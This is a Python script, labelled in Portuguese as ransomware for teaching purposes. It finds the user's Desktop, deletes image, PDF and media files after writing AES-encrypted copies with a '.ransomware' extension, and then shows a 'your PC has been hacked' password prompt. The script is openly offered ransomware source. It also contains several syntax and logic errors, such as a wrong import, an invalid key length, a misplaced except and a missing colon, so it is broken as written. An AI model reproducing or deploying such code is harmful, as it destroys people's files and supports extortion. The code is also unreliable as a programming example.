# ransonware feito com python para fins didáticos

# importando bibliotecas
 
from multiprocessing.sharedctypes import Value
import os
import glob 
import time
import pyaes
from pathlib import path

type_fyles = ["*.jpeg", "*.jpg", "*png", "*.pdf", "*.mp3", "*.mp4"]

print ('encrypting')
time.sleep(3)

#check in desktop

try:
    desktop = Path.home() / "Desktop"

except Exception: 
    pass

os.chdir(desktop)

def encrypting():
    for files in type_fyles:
        for format_fyle in glob.glob(files):
            print(format_fyle)
            f = open(f'{desktop}\\{format_fyle}', 'rb')
            file_data = f.read()
            f.close()

            os.remove(f'{desktop}\\{format_fyle}')
            key = "password" # pass for decrypt
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

            # change file ".ransomware"

            new_file = format_fyle + ".ransomware"
            new_file = open(f'{desktop}\\{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()

def decrypting(decrypt_file):
    try:
        for file in glob.glob('*.ransomware'):

            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey = keybytes 
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1] 

            dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()

            # if incorrect password :

            except ValueError as err: 
                print('Invalid Password!')
            
if __name__ == '__main__':
    encrypting()
    if encrypting:
        key = input('your PC has been hacked, enter password to unlock!')
        if key == 'password'

    descrypting(key)
    for del_file in glob.glob('*ransomware'):
        os.remove(f'{desktop}\\{del_file}')

    else:
        print('Incorrect Password!')

        